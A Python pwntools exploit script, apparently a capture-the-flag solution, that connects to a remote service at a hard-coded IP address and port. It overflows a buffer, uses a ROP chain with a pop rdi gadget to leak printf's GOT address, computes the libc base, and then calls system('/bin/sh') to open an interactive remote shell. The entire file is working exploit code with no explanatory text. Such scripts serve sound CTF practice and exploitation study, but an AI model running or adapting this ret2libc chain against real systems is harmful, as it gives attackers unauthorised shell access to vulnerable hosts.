from pwn import *

#p = process("./chall")
p = remote("34.101.174.85", 10007)

printf_got = 0x404018
printf_plt = 0x0000000000401060
pop_rdi = 0x0000000000401233
main_ret = 0x4011c8
main_func = main_ret-82

payload = b"a"*9
payload += p64(main_ret)
payload += p64(pop_rdi)
payload += p64(printf_got)
payload += p64(printf_plt)
payload += p64(main_ret)
payload += p64(main_func)

print(p.recvuntil(b"> "))
p.sendline(payload)
printf_leak = u64(p.recv(6) + b'\x00\x00')
print(hex(printf_leak))

libc_address = printf_leak-0x61c90
binsh = libc_address + 0x1b45bd
system = libc_address + 0x0000000000052290

payload2 = b"a"*9
payload2+=p64(main_ret)
payload2+=p64(pop_rdi)
payload2+=p64(binsh)
payload2+=p64(system)
payload2+=p64(0x0)

print(p.recvuntil(b"> "))
p.sendline(payload2)
p.interactive()

